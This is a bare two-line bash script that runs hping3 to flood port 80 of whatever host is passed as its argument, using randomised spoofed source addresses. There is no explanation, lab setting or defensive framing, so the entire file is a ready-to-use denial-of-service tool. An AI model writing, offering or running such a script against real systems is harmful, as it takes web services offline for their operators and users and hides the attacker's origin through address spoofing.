#!/bin/bash
hping3 --rand-source --flood -p 80 "$1"
